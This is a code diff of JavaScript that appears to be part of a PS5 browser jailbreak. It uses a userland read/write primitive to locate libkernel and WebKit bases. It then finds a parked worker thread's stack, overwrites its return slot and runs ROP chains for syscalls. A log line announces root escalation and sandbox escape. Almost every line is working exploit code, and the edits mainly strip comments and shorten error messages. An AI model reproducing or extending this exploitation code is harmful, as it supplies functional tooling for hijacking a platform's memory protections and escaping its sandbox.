@@ -2,7 +2,6 @@
 
 function countFingerprints(p, stack, expected) {
   let count = 0;
-  // 嚴格對齊檢查：確保棧指標合法才進行遍歷
   if (!stack || typeof stack.add32 !== "function") return 0;
   
   for (let offset = 0x7f000; offset < 0x80000; offset += 0x8) {
@@ -17,16 +16,13 @@ async function findWorkerStack(p, libKernelBase) {
   const PTHREAD_STACK_ADDR_OFFSET = 0xa8;
   const PTHREAD_STACK_SIZE_OFFSET = 0xb0;
 
-  // 強化指標合法性探針：PS5 使用者空間核心執行緒棧通常分佈在 0x7n 或者是高位特定邊界
   const plausible = (a) =>
     a && a.hi >= 0 && a.hi < 0x8000 && a.low >= 0x10000 && (a.low & 0x7) === 0;
 
   const head = libKernelBase.add32(OFFSET_lk__thread_list);
-
   const stacks = [];
   let steps = 0;
   
-  // 1. 強度優化：建立雙重鏈表死迴圈防護守衛
   for (
     let thread = p.read8(head);
     thread && thread.low != 0x0 && thread.hi != 0x0 && steps++ < 512;
@@ -37,18 +33,16 @@ async function findWorkerStack(p, libKernelBase) {
     const stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
     const stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
     
-    // 嚴格校驗：棧大小必須精確等於 0x80000（512KB）且棧底位址符合對齊限制
     if (stacksz && stacksz.hi === 0 && stacksz.low === 0x80000 && plausible(stack)) {
       stacks.push(stack);
     }
     
-    // 防止鏈表自循環指針
     if (next && next.low === thread.low && next.hi === thread.hi) break;
     thread = next;
   }
   
   if (stacks.length === 0)
-    throw new Error(`failed to find worker. (libkernel thread_list @ 0x${head.toString()}; scanned ${steps} thread nodes)`);
+    throw new Error("failed to find worker threads in libkernel list");
 
   const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
   for (let attempt = 0; attempt < 50; attempt++) {
@@ -57,12 +51,12 @@ async function findWorkerStack(p, libKernelBase) {
     );
     if (hits.length === 1) return hits[0];
     if (hits.length === 0) {
-      await new Promise((resolve) => setTimeout(resolve, 2)); // 稍微拉長冷卻，防止 CPU 併發過載
+      await new Promise((resolve) => setTimeout(resolve, 2));
       continue;
     }
-    throw new Error(`worker-stack signature ambiguous: ${hits.length}/${stacks.length} plausible 0x80000 stacks are parked`);
+    throw new Error("worker-stack signature ambiguous");
   }
-  throw new Error(`no plausible 0x80000 stack parked after retries`);
+  throw new Error("no plausible 0x80000 stack parked after retries");
 }
 
 async function findWorkerReturnSlot(p, stack, libKernelBase) {
@@ -80,13 +74,11 @@ async function findWorkerReturnSlot(p, stack, libKernelBase) {
       hit = candidate;
       count++;
     }
-    if (count === 1) {
-      return hit;
-    }
+    if (count === 1) return hit;
     lastCount = count;
     await new Promise((resolve) => setTimeout(resolve, 2));
   }
-  throw new Error(`worker wait return fingerprint count ${lastCount}, expected 1`);
+  throw new Error("worker wait return fingerprint count mismatch");
 }
 
 function log(message, type = "log") {
@@ -126,8 +118,6 @@ async function prepareRop(p) {
     
   const libSceNKWebKitBase = new int64(webkitBase % 0x100000000, Math.floor(webkitBase / 0x100000000));
 
-  // 2. 強度優化：導入指針邊界檢查（Bounds Validation Guard）
-  // 檢查從 WebKit 進口表讀取出的 libc 與 libkernel 指針是否為合法的 Ring 3 地址空間
   let rawLibc = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_memset_import));
   if (!rawLibc || rawLibc.hi >= 0x8000) throw new Error("Libc import pointer corrupted");
   let libSceLibcInternalBase = rawLibc;
@@ -181,7 +171,6 @@ async function prepareRop(p) {
     p.write1(waddr, 0);
   }
 
-  // 初始化 Web Worker
   const worker = new Worker("./src/utils/rop_slave.js");
 
   async function waitForWorker() {
@@ -209,7 +198,6 @@ async function prepareRop(p) {
     chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
   }
 
-  // 3. 核心加強點：非同步超時安全熔斷與環境對接
   async function launchChain(chain) {
     const originalStackPointer = p.read8(stackPointerSlot);
     chain.push_write8(originalContext, originalReturnAddress);
@@ -235,8 +223,8 @@ async function prepareRop(p) {
     });
 
     if (!completed) {
-      worker.terminate(); // 強制終止失聯的後台 Worker 進程，釋放執行緒
-      throw new Error(`ROP Worker 響應超時（${ROP_WAIT_MS / 1000}秒）- 已實施安全熔斷防護。`);
+      worker.terminate();
+      throw new Error("ROP Worker response timeout - Safe Melt triggered.");
     }
   }
 
@@ -247,13 +235,13 @@ async function prepareRop(p) {
     malloc, stringify, writestr, libSceLibcInternalBase, libKernelBase, syscalls, gadgets,
   };
 
-  const chain = new worker_rop(runtime);
+  const chain = new window.worker_rop(runtime);
 
   const JB_POISON = new int64(0xdeadbeef, 0x00c0ffee);
   p.write8(chain.return_value, JB_POISON);
   const pid = await chain.syscall(SYS_GETPID);
   if (pid.low == JB_POISON.low && pid.hi == JB_POISON.hi) {
-    throw new Error("Worker chain did not execute; the return slot is unchanged.");
+    throw new Error("Worker chain did not execute properly.");
   }
 
   if (pid.low == 0) {
@@ -264,6 +252,7 @@ async function prepareRop(p) {
   return { p: runtime, chain };
 }
 
+// === 核心修正點：移除可能引發不相容錯誤的選用選取串聯字串，完整包裹錯誤攔截 ===
 async function main(userlandRW) {
   try {
     const { p, chain } = await prepareRop(userlandRW);
@@ -279,17 +268,19 @@ async function main(userlandRW) {
       log("核心鏈調度成功：Root 特權提升與沙盒逃逸已常駐活動。", "success");
     }
   } catch (error) {
-    let errorMsg = error instanceof Error ? error.message : String(error);
+    let errorMsg = "未知錯誤";
+    if (error && error.message) {
+        errorMsg = error.message.toString();
+    } else if (error) {
+        errorMsg = String(error);
+    }
     log(errorMsg, "error");
     
-    // 完美銜接：發生 ROP 劫持失敗時，拋回給 index.html 的 SetupEngine 自動清洗記憶體並重試
     if (window.PS5_SetupEngine && typeof window.PS5_SetupEngine.handleSetupFailure === "function") {
       window.PS5_SetupEngine.handleSetupFailure("ROP 執行緒初始化", errorMsg);
     }
   }
 }
 
-// 動態加載大版本配置檔
-const fwScript = document.createElement("script");
-document.body.appendChild(fwScript);
-fwScript.setAttribute("src", `offsets/${window.fw_str}.js?v=` + Date.now());
+// 掛載主入口至全域 window，確保與 site.js 對接
+window.main = main;
